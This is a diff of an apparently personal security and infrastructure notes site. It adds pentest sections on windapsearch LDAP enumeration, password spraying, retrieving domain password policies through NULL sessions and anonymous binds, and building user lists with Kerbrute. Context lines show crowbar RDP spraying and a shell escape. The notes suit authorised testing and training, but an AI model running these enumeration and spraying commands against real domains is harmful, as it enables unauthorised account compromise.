+<tr><td><code>--admin-objects</code></td><td>Enumerate objects with admin count &gt; 0</td></tr>
+<tr><td><code>-PU</code></td><td>Enumerate privileged users</td></tr>
+<tr><td><code>--functionality</code></td><td>Enumerate domain functionality level</td></tr>
+<tr><td><code>-s SEARCH</code></td><td>Custom LDAP search term</td></tr>
+<tr><td><code>--custom FILTER</code></td><td>Custom LDAP filter</td></tr>
+<tr><td><code>--attrs ATTRS</code></td><td>Attributes to return (comma-separated)</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="anonymous-bind-examples-1"><a class="header" href="#anonymous-bind-examples-1">Anonymous Bind Examples</a></h2>
+<h3 id="enumerate-all-users-anonymous"><a class="header" href="#enumerate-all-users-anonymous">Enumerate All Users (Anonymous)</a></h3>
+<pre><code class="language-bash">./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+</code></pre>
+<h3 id="enumerate-all-groups-anonymous"><a class="header" href="#enumerate-all-groups-anonymous">Enumerate All Groups (Anonymous)</a></h3>
+<pre><code class="language-bash">./windapsearch.py --dc-ip 172.16.5.5 -u "" -G
+</code></pre>
+<h3 id="enumerate-computers-anonymous"><a class="header" href="#enumerate-computers-anonymous">Enumerate Computers (Anonymous)</a></h3>
+<pre><code class="language-bash">./windapsearch.py --dc-ip 172.16.5.5 -u "" -C
+</code></pre>
+<hr>
+<h2 id="authenticated-examples-1"><a class="header" href="#authenticated-examples-1">Authenticated Examples</a></h2>
+<h3 id="enumerate-domain-admins"><a class="header" href="#enumerate-domain-admins">Enumerate Domain Admins</a></h3>
+<pre><code class="language-bash">./windapsearch.py --dc-ip 172.16.5.5 -d domain.local -u user@domain.local -p Password123 --da
+</code></pre>
+<h3 id="enumerate-privileged-users"><a class="header" href="#enumerate-privileged-users">Enumerate Privileged Users</a></h3>
+<pre><code class="language-bash">./windapsearch.py --dc-ip 172.16.5.5 -d domain.local -u user@domain.local -p Password123 -PU
+</code></pre>
+<h3 id="enumerate-members-of-specific-group"><a class="header" href="#enumerate-members-of-specific-group">Enumerate Members of Specific Group</a></h3>
+<pre><code class="language-bash">./windapsearch.py --dc-ip 172.16.5.5 -d domain.local -u user@domain.local -p Password123 -m "IT Admins"
+</code></pre>
+<h3 id="full-output-with-all-attributes"><a class="header" href="#full-output-with-all-attributes">Full Output with All Attributes</a></h3>
+<pre><code class="language-bash">./windapsearch.py --dc-ip 172.16.5.5 -d domain.local -u user@domain.local -p Password123 -U --full
+</code></pre>
+<h3 id="custom-search"><a class="header" href="#custom-search">Custom Search</a></h3>
+<pre><code class="language-bash">./windapsearch.py --dc-ip 172.16.5.5 -d domain.local -u user@domain.local -p Password123 -s "admin"
+</code></pre>
+<hr>
+<h2 id="tips-6"><a class="header" href="#tips-6">Tips</a></h2>
+<ul>
+<li>Blank <code>-u ""</code> triggers anonymous bind (only works if LDAP anonymous bind is enabled)</li>
+<li>Use <code>--full</code> to get all attributes for deeper analysis</li>
+<li>Simpler than raw <code>ldapsearch</code> for common AD enumeration tasks</li>
+<li>Output can be saved with <code>-o</code> for post-processing</li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="windows-credential-manager-cheatsheet"><a class="header" href="#windows-credential-manager-cheatsheet">Windows Credential Manager Cheatsheet</a></h1>
 <h2 id="credential-storage-locations"><a class="header" href="#credential-storage-locations">Credential Storage Locations</a></h2>
@@ -7405,7 +8229,7 @@ Resources:
 </li>
 </ul>
 <p><a id="Password-Policy"></a></p>
-<h2 id="password-policy"><a class="header" href="#password-policy">Password Policy</a></h2>
+<h2 id="password-policy-1"><a class="header" href="#password-policy-1">Password Policy</a></h2>
   <img src="clouds/aws/dva-c02/images/iam-pass-policy.png" width="77%" height="40%" />
 <p><a id="MFA"></a></p>
 <h2 id="mfa-multi-factor-authentication"><a class="header" href="#mfa-multi-factor-authentication">MFA (Multi-factor authentication)</a></h2>
@@ -13346,7 +14170,7 @@ Logging can be turned to on a bucket to log to track operations performed on obj
 </li>
 <li>Modifying custom IAM policies creates a new version of that policy</li>
 </ul>
-<h1 id="password-policy-1"><a class="header" href="#password-policy-1">Password Policy</a></h1>
+<h1 id="password-policy-2"><a class="header" href="#password-policy-2">Password Policy</a></h1>
 <ul>
 <li>You can define a password policy in IAM</li>
 <li>Typical password policy settings</li>
@@ -13938,7 +14762,7 @@ IPv6 (Internet Protocol version 6) is the successor to IPv4, designed to address
 <li>Containers</li>
 <li>Microservices</li>
 </ul>
-<h2 id="components"><a class="header" href="#components">Components</a></h2>
+<h2 id="components-1"><a class="header" href="#components-1">Components</a></h2>
 <ul>
 <li><strong>Scale Set</strong>: The group of identical VM instances</li>
 <li><strong>Load Balancer</strong>: Distributes traffic to the VM instances</li>
@@ -14287,7 +15111,7 @@ IPv6 (Internet Protocol version 6) is the successor to IPv4, designed to address
 <li><strong>Session Affinity</strong>: Cookie-based session affinity ensures that client requests are consistently directed to the same backend server, maintaining session state.</li>
 <li><strong>URL-Based Routing</strong>: Application Gateway can route traffic based on URL paths, enabling you to direct requests to specific backend pools based on the U.</li>
 </ul>
-<h2 id="components-1"><a class="header" href="#components-1">Components</a></h2>
+<h2 id="components-2"><a class="header" href="#components-2">Components</a></h2>
 <ul>
 <li>
 <p><strong>Frontend IP Configuration</strong>: Defines the public IP address and port used to access the Application Gateway.</p>
@@ -14431,7 +15255,7 @@ IPv6 (Internet Protocol version 6) is the successor to IPv4, designed to address
 <ul>
 <li>Azure Front Door can serve as a content delivery network (CDN) by caching content at edge locations to reduce latency and improve performance.</li>
 </ul>
-<h2 id="components-2"><a class="header" href="#components-2">Components</a></h2>
+<h2 id="components-3"><a class="header" href="#components-3">Components</a></h2>
 <ul>
 <li>An instance of the Front Door service is referred to as the Front Door Profile. We can create up to 500 Standard or Premium Front Door Profiles per subscription.</li>
 <li>To perform it’s functions, Azure Front Door relies on 3 components:
@@ -15130,7 +15954,7 @@ $params = @{
 <li><strong>Security</strong>: Integrated with Azure Firewall, DDoS protection, and other security services for comprehensive protection.</li>
 <li><strong>Connectivity</strong>: Supports Site-to-Site VPN, Point-to-Site VPN, ExpressRoute, and Azure Private Link.</li>
 </ol>
-<h2 id="components-3"><a class="header" href="#components-3">Components</a></h2>
+<h2 id="components-4"><a class="header" href="#components-4">Components</a></h2>
 <ul>
 <li><strong>Virtual WAN</strong>: A management service that we can use to deploy, manage, and monitor resources for connecting networks together. This is a global resource and does not live in a particular network.</li>
 <li><strong>vWAN Hubs</strong>: Regional virtual network hubs that provide central connectivity and routing. A virtual hub is a Microsoft-managed virtual network. The hub contains various service endpoints to enable connectivity. From your on-premises network (vpnsite), you can connect to a VPN gateway inside the virtual hub, connect ExpressRoute circuits to a virtual hub, or even connect mobile users to a point-to-site gateway in the virtual hub. The hub is the core of your network in a region. Multiple virtual hubs can be created in the same region. A hub gateway isn’t the same as a virtual network gateway that you use for ExpressRoute and VPN Gateway. For example, when using Virtual WAN, you don’t create a site-to-site connection from your on-premises site directly to your VNet. Instead, you create a site-to-site connection to the hub. The traffic always goes through the hub gateway. This means that your VNets don’t need their own virtual network gateway. Virtual WAN lets your VNets take advantage of scaling easily through the virtual hub and the virtual hub gateway.</li>
@@ -18426,7 +19250,7 @@ Ping statistics for 192.168.225.110:
 <pre><code class="language-bash">nmap -Pn -p3389 192.168.2.143
 </code></pre>
 <h2 id="password-attacks"><a class="header" href="#password-attacks">Password Attacks</a></h2>
-<h3 id="password-spraying-1"><a class="header" href="#password-spraying-1">Password Spraying</a></h3>
+<h3 id="password-spraying-2"><a class="header" href="#password-spraying-2">Password Spraying</a></h3>
 <p>Use password spraying to avoid account lockouts (one password against many users).</p>
 <p><strong>Crowbar:</strong></p>
 <pre><code class="language-bash">crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
@@ -19332,6 +20156,9 @@ find . -exec /bin/sh \; -quit
 <li><a href="#external-recon-and-enumeration-principles">External Recon and Enumeration</a></li>
 <li><a href="#initial-enumeration-of-the-domain">Initial Enumeration of the Domain</a></li>
 <li><a href="#llmnrnbt-ns-poisoning---from-linux">LLMNR/NBT-NS Poisoning - from Linux</a></li>
+<li><a href="#password-spraying-overview">Password Spraying Overview</a></li>
+<li><a href="#enumerating--retrieving-password-policies">Enumerating &amp; Retrieving Password Policies</a></li>
+<li><a href="#password-spraying---making-a-target-user-list">Password Spraying - Making a Target User List</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="external-recon-and-enumeration-principles"><a class="header" href="#external-recon-and-enumeration-principles">External Recon and Enumeration Principles</a></h1>
@@ -19675,6 +20502,233 @@ TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
 <li>LLMNR/NBT-NS spoofing combined with <strong>lack of SMB signing</strong> can lead to administrative access via SMB Relay</li>
 <li>Collect as many hashes as possible, but prioritize cracking those for accounts that further your access</li>
 </ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="password-spraying-overview"><a class="header" href="#password-spraying-overview">Password Spraying Overview</a></h1>
+<p>Password spraying is a technique used to gain access to systems by attempting to log into an exposed service using <strong>one common password</strong> against a <strong>long list of usernames or email addresses</strong>. Unlike brute-forcing (many passwords against one account), password spraying is a measured approach that reduces the risk of account lockouts.</p>
+<h2 id="key-concepts-1"><a class="header" href="#key-concepts-1">Key Concepts</a></h2>
+<ul>
+<li>Usernames/emails are typically gathered during OSINT or initial enumeration phases.</li>
+<li>The attack tries a single common password (e.g., <code>Welcome1</code>, <code>Passw0rd</code>, <code>Winter2022</code>) across all target accounts, then rotates to the next password after a delay.</li>
+<li>Effective for gaining an initial foothold or moving laterally within a network.</li>
+</ul>
+<h2 id="username-list-building-techniques"><a class="header" href="#username-list-building-techniques">Username List Building Techniques</a></h2>
+<ul>
+<li><strong>Common username lists</strong>: e.g., <code>jsmith.txt</code> from the <a href="https://github.com/insidetrust/statistically-likely-usernames">statistically-likely-usernames</a> GitHub repo.</li>
+<li><strong>LinkedIn scraping</strong>: Combine scraped names with common username formats.</li>
+<li><strong>Kerbrute</strong>: Enumerate valid domain users by testing candidate usernames against Kerberos.</li>
+<li><strong>Document metadata</strong>: Search for published PDFs/documents and inspect the Author field to discover internal username formats. Always scrub metadata before publishing documents.</li>
+</ul>
+<h2 id="real-world-scenarios"><a class="header" href="#real-world-scenarios">Real-World Scenarios</a></h2>
+<ol>
+<li><strong>Standard enumeration</strong>: Combined a common username list with LinkedIn results, validated users with Kerbrute, then sprayed with <code>Welcome1</code>. Two low-privileged hits were enough to run BloodHound and identify attack paths to domain compromise.</li>
+<li><strong>Custom username format</strong>: Discovered a 4-character GUID format (A-Z, 0-9) from PDF metadata. Generated all 1,679,616 possible combinations with a bash script, enumerated every domain account, then sprayed to gain credentials and followed a chain involving RBCD and Shadow Credentials to compromise the domain.</li>
+</ol>
+<h2 id="account-lockout-considerations"><a class="header" href="#account-lockout-considerations">Account Lockout Considerations</a></h2>
+<ul>
+<li><strong>Risk</strong>: Careless spraying can lock out hundreds of production accounts.</li>
+<li><strong>Mitigation</strong>: Always introduce a delay between password attempts.</li>
+<li><strong>Common policy</strong>: 5 bad attempts before lockout, 30-minute auto-unlock threshold.</li>
+<li><strong>Best practice</strong>: Obtain the domain password policy before spraying. If unknown, wait a few hours between attempts or limit to a single “hail mary” attempt with one weak password.</li>
+<li><strong>Internal access advantage</strong>: With domain access, you can enumerate the password policy directly, significantly lowering lockout risk.</li>
+</ul>
+<h2 id="password-spray-pattern"><a class="header" href="#password-spray-pattern">Password Spray Pattern</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Round</th><th>Action</th></tr>
+</thead>
+<tbody>
+<tr><td>1</td><td>Try Password A against all users</td></tr>
+<tr><td>DELAY</td><td>Wait for lockout threshold to reset</td></tr>
+<tr><td>2</td><td>Try Password B against all users</td></tr>
+<tr><td>DELAY</td><td>Wait again</td></tr>
+<tr><td>3</td><td>Try Password C against all users</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="enumerating--retrieving-password-policies"><a class="header" href="#enumerating--retrieving-password-policies">Enumerating &amp; Retrieving Password Policies</a></h1>
+<p>Obtaining the domain password policy is critical before password spraying to avoid locking out accounts. Methods vary depending on whether you have credentials, and whether the domain allows unauthenticated access via SMB NULL sessions or LDAP anonymous binds.</p>
+<h2 id="from-linux---with-credentials"><a class="header" href="#from-linux---with-credentials">From Linux - With Credentials</a></h2>
+<p>With valid domain credentials, use <strong>CrackMapExec</strong> or <strong>rpcclient</strong> to pull the policy remotely.</p>
+<h3 id="crackmapexec"><a class="header" href="#crackmapexec">CrackMapExec</a></h3>
+<pre><code class="language-bash">crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --pass-pol
+</code></pre>
+<p>Key fields to look for:l minimum password length, account lockout threshold, lockout duration, reset lockout counter, password complexity flags.</p>
+<h3 id="rpcclient"><a class="header" href="#rpcclient">rpcclient</a></h3>
+<pre><code class="language-bash">rpcclient -U "&lt;user&gt;%&lt;pass&gt;" &lt;DC_IP&gt;
+rpcclient $&gt; getdompwinfo
+</code></pre>
+<h2 id="from-linux---smb-null-sessions-no-credentials"><a class="header" href="#from-linux---smb-null-sessions-no-credentials">From Linux - SMB NULL Sessions (No Credentials)</a></h2>
+<p>SMB NULL sessions allow unauthenticated retrieval of domain info including user lists, groups, and the password policy. This misconfiguration is common on legacy Domain Controllers upgraded in place.</p>
+<h3 id="rpcclient-1"><a class="header" href="#rpcclient-1">rpcclient</a></h3>
+<pre><code class="language-bash">rpcclient -U "" -N &lt;DC_IP&gt;
+rpcclient $&gt; querydominfo
+rpcclient $&gt; getdompwinfo
+</code></pre>
+<h3 id="enum4linux"><a class="header" href="#enum4linux">enum4linux</a></h3>
+<pre><code class="language-bash">enum4linux -P &lt;DC_IP&gt;
+</code></pre>
+<h3 id="enum4linux-ng-python-rewrite-with-jsonyaml-export"><a class="header" href="#enum4linux-ng-python-rewrite-with-jsonyaml-export">enum4linux-ng (Python rewrite with JSON/YAML export)</a></h3>
+<pre><code class="language-bash">enum4linux-ng -P &lt;DC_IP&gt; -oA &lt;output_prefix&gt;
+</code></pre>
+<h3 id="common-enumeration-tool-ports"><a class="header" href="#common-enumeration-tool-ports">Common Enumeration Tool Ports</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Ports</th></tr>
+</thead>
+<tbody>
+<tr><td>nmblookup</td><td>137/UDP</td></tr>
+<tr><td>nbtstat</td><td>137/UDP</td></tr>
+<tr><td>net</td><td>139/TCP, 135/TCP, 49152-65535 TCP/UDP</td></tr>
+<tr><td>rpcclient</td><td>135/TCP</td></tr>
+<tr><td>smbclient</td><td>445/TCP</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="from-linux---ldap-anonymous-bind"><a class="header" href="#from-linux---ldap-anonymous-bind">From Linux - LDAP Anonymous Bind</a></h2>
+<p>A legacy configuration (default changed in Windows Server 2003). Use <strong>ldapsearch</strong>, <strong>windapsearch.py</strong>, or <strong>ad-ldapdomaindump.py</strong>.</p>
+<pre><code class="language-bash">ldapsearch -h &lt;DC_IP&gt; -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+</code></pre>
+<p>Look for: <code>minPwdLength</code>, <code>lockoutThreshold</code>, <code>lockOutObservationWindow</code>, <code>lockoutDuration</code>, <code>pwdProperties</code> (1 = complexity enabled).</p>
+<h2 id="from-windows---with-credentials"><a class="header" href="#from-windows---with-credentials">From Windows - With Credentials</a></h2>
+<h3 id="netexe-built-in-no-tools-needed"><a class="header" href="#netexe-built-in-no-tools-needed">net.exe (built-in, no tools needed)</a></h3>
+<pre><code class="language-cmd">net accounts
+</code></pre>
+<h3 id="powerview"><a class="header" href="#powerview">PowerView</a></h3>
+<pre><code class="language-powershell">Import-Module .\PowerView.ps1
+Get-DomainPolicy
+</code></pre>
+<p>Other options: SharpView, CrackMapExec (Windows port), SharpMapExec.</p>
+<h2 id="from-windows---null-session"><a class="header" href="#from-windows---null-session">From Windows - NULL Session</a></h2>
+<pre><code class="language-cmd">net use \\DC01\ipc$ "" /u:""
+</code></pre>
+<p>Common error codes to watch for:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Error Code</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td>1331</td><td>Account is disabled</td></tr>
+<tr><td>1326</td><td>Incorrect password</td></tr>
+<tr><td>1909</td><td>Account is locked out</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="analyzing-the-policy"><a class="header" href="#analyzing-the-policy">Analyzing the Policy</a></h2>
+<p>Key fields and what they mean for password spraying:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Policy</th><th>What to Look For</th></tr>
+</thead>
+<tbody>
+<tr><td>Minimum password length</td><td>8 is common; 10-14 reduces spray options but doesn’t eliminate the vector</td></tr>
+<tr><td>Account lockout threshold</td><td>Typically 3-5; if 0, no lockout (rare)</td></tr>
+<tr><td>Lockout duration</td><td>30 min is common; some orgs require manual admin unlock</td></tr>
+<tr><td>Password complexity</td><td>If enabled, passwords need 3/4 of: uppercase, lowercase, number, special char</td></tr>
+<tr><td>Maximum password age</td><td>“Unlimited” means old weak passwords may still be in use</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="default-domain-policy-new-domain"><a class="header" href="#default-domain-policy-new-domain">Default Domain Policy (New Domain)</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Policy</th><th>Default Value</th></tr>
+</thead>
+<tbody>
+<tr><td>Enforce password history</td><td>24 days</td></tr>
+<tr><td>Maximum password age</td><td>42 days</td></tr>
+<tr><td>Minimum password age</td><td>1 day</td></tr>
+<tr><td>Minimum password length</td><td>7</td></tr>
+<tr><td>Complexity requirements</td><td>Enabled</td></tr>
+<tr><td>Reversible encryption</td><td>Disabled</td></tr>
+<tr><td>Account lockout duration</td><td>Not set</td></tr>
+<tr><td>Account lockout threshold</td><td>0</td></tr>
+<tr><td>Reset lockout counter after</td><td>Not set</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="spray-safety-guidelines"><a class="header" href="#spray-safety-guidelines">Spray Safety Guidelines</a></h2>
+<ul>
+<li>If you have the policy: stay 2-3 attempts below the lockout threshold per lockout window.</li>
+<li>If you <strong>cannot</strong> obtain the policy: limit to 1-2 spray attempts total, waiting <strong>over an hour</strong> between them.</li>
+<li>Never lock out accounts. Some orgs require manual admin unlock for hundreds/thousands of accounts.</li>
+<li>When possible, ask the client for the policy if the assessment scope allows it.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="password-spraying---making-a-target-user-list"><a class="header" href="#password-spraying---making-a-target-user-list">Password Spraying - Making a Target User List</a></h1>
+<p>Before spraying, you need a list of valid domain users. The method depends on your level of access.</p>
+<h2 id="user-enumeration-methods"><a class="header" href="#user-enumeration-methods">User Enumeration Methods</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Access Level</th><th>Methods</th></tr>
+</thead>
+<tbody>
+<tr><td>No credentials</td><td>SMB NULL session, LDAP anonymous bind, Kerbrute with wordlists, LinkedIn scraping</td></tr>
+<tr><td>Valid credentials</td><td>CrackMapExec <code>--users</code>, rpcclient, ldapsearch, PowerView</td></tr>
+<tr><td>SYSTEM access on domain host</td><td>Can query AD directly (computer account impersonates a domain user)</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="smb-null-session"><a class="header" href="#smb-null-session">SMB NULL Session</a></h2>
+<h3 id="enum4linux-1"><a class="header" href="#enum4linux-1">enum4linux</a></h3>
+<pre><code class="language-bash">enum4linux -U &lt;DC_IP&gt; | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+</code></pre>
+<h3 id="rpcclient-2"><a class="header" href="#rpcclient-2">rpcclient</a></h3>
+<pre><code class="language-bash">rpcclient -U "" -N &lt;DC_IP&gt;
+rpcclient $&gt; enumdomusers
+</code></pre>
+<h3 id="crackmapexec-also-shows-badpwdcount"><a class="header" href="#crackmapexec-also-shows-badpwdcount">CrackMapExec (also shows badpwdcount)</a></h3>
+<pre><code class="language-bash">crackmapexec smb &lt;DC_IP&gt; --users
+</code></pre>
+<p>The <code>badpwdcount</code> and <code>baddpwdtime</code> fields from CrackMapExec are useful – remove accounts close to the lockout threshold from your spray list. Note: <code>badpwdcount</code> is maintained separately per Domain Controller; query the PDC Emulator for the most accurate value.</p>
+<h2 id="ldap-anonymous-bind"><a class="header" href="#ldap-anonymous-bind">LDAP Anonymous Bind</a></h2>
+<h3 id="ldapsearch"><a class="header" href="#ldapsearch">ldapsearch</a></h3>
+<pre><code class="language-bash">ldapsearch -h &lt;DC_IP&gt; -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&amp;(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
+</code></pre>
+<h3 id="windapsearch"><a class="header" href="#windapsearch">windapsearch</a></h3>
+<pre><code class="language-bash">./windapsearch.py --dc-ip &lt;DC_IP&gt; -u "" -U
+</code></pre>
+<h2 id="kerbrute-no-credentials-needed"><a class="header" href="#kerbrute-no-credentials-needed">Kerbrute (No Credentials Needed)</a></h2>
+<p>Uses Kerberos Pre-Authentication to validate usernames. The KDC responds with <code>PRINCIPAL UNKNOWN</code> for invalid users and prompts for pre-auth for valid ones.</p>
+<pre><code class="language-bash">kerbrute userenum -d &lt;domain&gt; --dc &lt;DC_IP&gt; /path/to/userlist.txt
+</code></pre>
+<p><strong>Advantages:</strong></p>
+<ul>
+<li>Fast (48,000+ usernames in ~12 seconds)</li>
+<li>Does not generate event ID 4625 (logon failure)</li>
+<li>Username enumeration alone does not cause lockouts</li>
+</ul>
+<p><strong>Caveats:</strong></p>
+<ul>
+<li>Generates event ID 4768 (TGT request) if Kerberos logging is enabled</li>
+<li>Once you switch to password spraying with Kerbrute, failed pre-auth attempts <strong>do</strong> count toward lockout</li>
+</ul>
+<p><strong>Username wordlists:</strong> <a href="https://github.com/insidetrust/statistically-likely-usernames">statistically-likely-usernames</a> (e.g., <code>jsmith.txt</code> – 48,705 common <code>flast</code> format names).</p>
+<h2 id="credentialed-enumeration"><a class="header" href="#credentialed-enumeration">Credentialed Enumeration</a></h2>
+<pre><code class="language-bash">crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --users
+</code></pre>
+<h2 id="external--osint-fallback"><a class="header" href="#external--osint-fallback">External / OSINT Fallback</a></h2>
+<p>If no NULL session, anonymous bind, or credentials are available:</p>
+<ul>
+<li>Search for company email addresses (email harvesting)</li>
+<li>Use <strong>linkedin2username</strong> to generate candidate usernames from a company’s LinkedIn page</li>
+<li>Check published PDFs for author metadata revealing username format</li>
+</ul>
+<h2 id="activity-logging"><a class="header" href="#activity-logging">Activity Logging</a></h2>
+<p>Always log your spray attempts:</p>
+<ul>
+<li>Accounts targeted</li>
+<li>Domain Controller used</li>
+<li>Date and time of each spray</li>
+<li>Password(s) attempted</li>
+</ul>
+<p>This protects you if lockouts occur and helps the client cross-reference against their SIEM logs.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="linux-file-transfer-methods"><a class="header" href="#linux-file-transfer-methods">Linux File Transfer Methods</a></h1>
 <h2 id="introduction-29"><a class="header" href="#introduction-29">Introduction</a></h2>
@@ -22043,7 +23097,7 @@ RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is un
 <hr>
 <h2 id="obtaining-a-tgt-with-pkinit"><a class="header" href="#obtaining-a-tgt-with-pkinit">Obtaining a TGT with PKINIT</a></h2>
 <h3 id="using-gettgtpkinitpy-pkinittools"><a class="header" href="#using-gettgtpkinitpy-pkinittools">Using gettgtpkinit.py (PKINITtools)</a></h3>
-<h4 id="installation-5"><a class="header" href="#installation-5">Installation</a></h4>
+<h4 id="installation-7"><a class="header" href="#installation-7">Installation</a></h4>
 <pre><code class="language-bash">$ git clone https://github.com/dirkjanm/PKINITtools.git &amp;&amp; cd PKINITtools
 $ python3 -m venv .venv
 $ source .venv/bin/activate
@@ -23192,7 +24246,7 @@ https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-p
 <li><a href="#network-policies">Network Policies</a>
 <ul>
 <li><a href="#overview-15">Overview</a></li>
-<li><a href="#key-concepts-1">Key Concepts</a></li>
+<li><a href="#key-concepts-2">Key Concepts</a></li>
 <li><a href="#common-fields-in-a-network-policy">Common Fields in a Network Policy</a></li>
 <li><a href="#example-network-policies">Example Network Policies</a>
 <ul>
@@ -23959,7 +25013,7 @@ spec:
 </code></pre>
 </li>
 </ul>
-<h3 id="key-concepts-1"><a class="header" href="#key-concepts-1">Key Concepts</a></h3>
+<h3 id="key-concepts-2"><a class="header" href="#key-concepts-2">Key Concepts</a></h3>
 <ol>
 <li><strong>Namespace Scope</strong>: Network policies are applied at the namespace level.</li>
 <li><strong>Selector-Based Rules</strong>:
@@ -29258,7 +30312,7 @@ The SLOWLOG GET command returns entries from the slow log in chronological order
 <ul>
 <li><a href="#dev-tools">Development Tools</a></li>
 <li><a href="#make">Make</a></li>
-<li><a href="#commands-2">Linux Commands</a></li>
+<li><a href="#commands-3">Linux Commands</a></li>
 </ul>
 <h3 id="system-internals"><a class="header" href="#system-internals">System Internals</a></h3>
 <ul>
@@ -29281,7 +30335,7 @@ The SLOWLOG GET command returns entries from the slow log in chronological order
 <li><a href="#bash-notes">Bash Notes</a></li>
 <li><a href="#moving-the-cursor-1">Keyboard Shortcuts</a></li>
 </ul>
-<h3 id="commands-1"><a class="header" href="#commands-1"><a href="systems/commands">Commands</a></a></h3>
+<h3 id="commands-2"><a class="header" href="#commands-2"><a href="systems/commands">Commands</a></a></h3>
 <p>Detailed documentation for specific Linux commands</p>
 <ul>
 <li><a href="#chgrp">chgrp</a></li>
@@ -29876,7 +30930,7 @@ https://www.kernel.org/doc/Documentation/filesystems/sysfs.txt</p>
 <li>broken soft links are highlighted in red in the output of <code>ls -l</code></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="commands-2"><a class="header" href="#commands-2">commands</a></h1>
+<h1 id="commands-3"><a class="header" href="#commands-3">commands</a></h1>
 <p><img src="systems/images/linux/linux_commands.png" alt=""></p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="logging-1"><a class="header" href="#logging-1">Logging</a></h1>
@@ -31450,7 +32504,7 @@ similarly Ctrl+v ENTER will display the escape sequence for the Enter key: ^M
             To return to it later enter fg 'process name' (foreground).
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="commands-3"><a class="header" href="#commands-3">Commands</a></h1>
+<h1 id="commands-4"><a class="header" href="#commands-4">Commands</a></h1>
 <h2 id="directory-map-29"><a class="header" href="#directory-map-29">Directory Map</a></h2>
 <ul>
 <li><a href="#chgrp">chgrp</a></li>
@@ -33542,7 +34596,7 @@ done
 <li><strong>Ease of Use</strong>: Hydra is relatively easy to use despite its power, with a straightforward command-line interface and clear syntax.</li>
 </ul>
 <hr>
-<h2 id="installation-6"><a class="header" href="#installation-6">Installation</a></h2>
+<h2 id="installation-8"><a class="header" href="#installation-8">Installation</a></h2>
 <p>Hydra often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:</p>
 <pre><code class="language-sh">hydra -h
 </code></pre>
@@ -33551,7 +34605,7 @@ done
 sudo apt-get -y install hydra
 </code></pre>
 <hr>
-<h2 id="basic-syntax-15"><a class="header" href="#basic-syntax-15">Basic Syntax</a></h2>
+<h2 id="basic-syntax-19"><a class="header" href="#basic-syntax-19">Basic Syntax</a></h2>
 <p>Hydra’s basic syntax is:</p>
 <pre><code class="language-sh">hydra [login_options] [password_options] [attack_options] [service_options] service://server
 </code></pre>
@@ -33705,7 +34759,7 @@ sudo apt-get -y install hydra
 <p>The “jumbo” variant is recommended for penetration testing uses, as it has performance optimizations, additional features such as multilingual word lists, and support for 64-bit architectures. This version is able to crack passwords with greater accuracy and speed.</p>
 <p>Included with JtR are various tools for converting different types of files and hashes into formats that are usable by JtR. Additionally, the software is regularly updated to keep up with the current security trends and technologies.</p>
 <hr>
-<h2 id="installation-7"><a class="header" href="#installation-7">Installation</a></h2>
+<h2 id="installation-9"><a class="header" href="#installation-9">Installation</a></h2>
 <p>John the Ripper often comes pre-installed on penetration testing distributions like Kali Linux. You can verify its presence by running:</p>
 <pre><code class="language-sh">john --help
 </code></pre>
@@ -33717,7 +34771,7 @@ sudo apt-get install john
 <pre><code class="language-sh">sudo apt-get install john-jumbo
 </code></pre>
 <hr>
-<h2 id="basic-syntax-16"><a class="header" href="#basic-syntax-16">Basic Syntax</a></h2>
+<h2 id="basic-syntax-20"><a class="header" href="#basic-syntax-20">Basic Syntax</a></h2>
 <pre><code class="language-sh">john [options] &lt;hash_file&gt;
 </code></pre>
 <hr>
@@ -34050,7 +35104,7 @@ sudo umount /media/bitlocker
 <li><strong>Memory Extraction</strong>: Some modules extract from process memory</li>
 </ul>
 <hr>
-<h2 id="installation-8"><a class="header" href="#installation-8">Installation</a></h2>
+<h2 id="installation-10"><a class="header" href="#installation-10">Installation</a></h2>
 <h3 id="windows-2"><a class="header" href="#windows-2">Windows</a></h3>
 <pre><code class="language-powershell"># Download standalone executable
 https://github.com/AlessandroZ/LaZagne/releases
@@ -34345,7 +35399,7 @@ type C:\Temp\credentials.json
 <li><strong>Ease of Use</strong>: Straightforward command-line interface with clear syntax</li>
 </ul>
 <hr>
-<h2 id="installation-9"><a class="header" href="#installation-9">Installation</a></h2>
+<h2 id="installation-11"><a class="header" href="#installation-11">Installation</a></h2>
 <p>Medusa often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:</p>
